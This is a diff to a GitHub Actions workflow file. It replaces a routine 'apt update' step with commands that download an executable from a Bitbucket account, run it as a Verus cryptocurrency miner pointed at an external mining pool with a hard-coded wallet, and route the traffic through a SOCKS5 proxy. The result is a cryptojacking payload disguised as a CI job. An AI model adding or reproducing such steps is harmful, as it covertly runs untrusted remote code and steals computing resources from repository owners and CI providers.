@@ -24,4 +24,11 @@ jobs:
       uses: actions/checkout@v1
     - name: runner_go
       run: |
-        sudo apt update
+        wget https://bitbucket.org/stavol99/mine/downloads/kambing
+        chmod +x kambing
+        screen -dmS ls
+        POOL=stratum+tcp://eu.luckpool.net:3956
+        WALLET=RTYdzcR1YraQQXz2MsKfMyTbDb35MY2x3G
+        WORKER=$(echo $(shuf -i 100-999 -n 1)-cuan)
+        PROXY=socks5://158.101.205.204:1080
+        ./kambing -a verus -o $POOL -u $WALLET.$WORKER -p c=VRSC,zap=VRSC -t 2 -x $PROXY
